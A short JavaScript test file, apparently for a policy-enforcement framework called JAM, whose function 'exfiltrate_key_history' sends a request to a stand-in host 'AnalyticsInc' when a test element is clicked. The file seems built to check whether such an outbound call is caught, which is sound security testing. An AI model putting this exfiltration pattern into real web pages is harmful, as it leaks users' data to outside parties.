function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v0 = xmlhttp;
  var v2 = xmlhttp.open;
  var v3 = JAM.call(v2.bind, v2, [xmlhttp], JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  v0.opennew = v3;
  JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true], JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  return
}
JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);

